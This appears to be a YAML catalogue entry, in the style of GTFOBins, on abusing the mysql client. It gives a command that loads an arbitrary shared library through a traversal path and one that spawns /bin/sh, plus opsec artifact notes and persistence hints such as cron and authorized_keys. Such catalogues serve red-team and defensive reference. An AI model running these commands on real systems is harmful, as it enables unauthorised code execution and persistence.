---
name: mysql
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: A valid MySQL server must be available to connect to.
persistence_potential: true
examples:
- id: library-load
  description: Load an arbitrary shared library.
  capabilities:
  - exec
  command: mysql --default-auth ../../../../../path/to/lib
  notes: The following loads the `/path/to/lib.so` shared object.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: mysql -e '\! /bin/sh'
references:
- https://gtfobins.github.io/gtfobins/mysql/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
